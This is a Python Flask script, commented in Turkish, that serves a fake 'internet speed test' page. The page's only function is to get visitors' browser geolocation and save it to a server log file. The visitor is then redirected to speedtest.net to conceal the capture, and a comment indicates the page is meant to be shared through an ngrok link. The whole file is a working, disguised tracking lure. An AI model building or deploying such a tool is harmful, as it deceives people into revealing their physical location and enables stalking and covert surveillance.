from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# HTML ve JavaScript kodunu direkt Python içine gömüyoruz
SAYFA_KODU = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Internet Hiz Testi</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f4f4f4; }
        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        button { background-color: #007bff; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <h1>Baglanti Hizini Olc</h1>
        <p>Hiz testi yapmak icin butona basiniz.</p>
        <button onclick="yakala()">TESTI BASLAT</button>
    </div>

    <script>
        function yakala() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(gonder, hata);
            } else { alert("Tarayici desteklemiyor."); }
        }

        function gonder(pos) {
            const veri = { lat: pos.coords.latitude, lon: pos.coords.longitude };
            // Kendi uzerindeki /kaydet rotasina veri gonderir
            fetch('/kaydet', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(veri)
            }).then(() => {
                window.location.href = "https://www.speedtest.net";
            });
        }

        function hata() { window.location.href = "https://www.speedtest.net"; }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    # Birisi ngrok linkine tikladiginda gorecegi sayfa
    return render_template_string(SAYFA_KODU)

@app.route('/kaydet', methods=['POST'])
def kaydet():
    veri = request.json
    enlem = veri.get('lat')
    boylam = veri.get('lon')
    with open("gelen_konumlar.txt", "a", encoding="utf-8") as f:
        f.write(f"Konum: {enlem}, {boylam}\\n")
    print(f"\\n[!] YENI KONUM: {enlem}, {boylam}")
    return jsonify({"status": "ok"}), 200

if __name__ == '__main__':
    app.run(port=5000)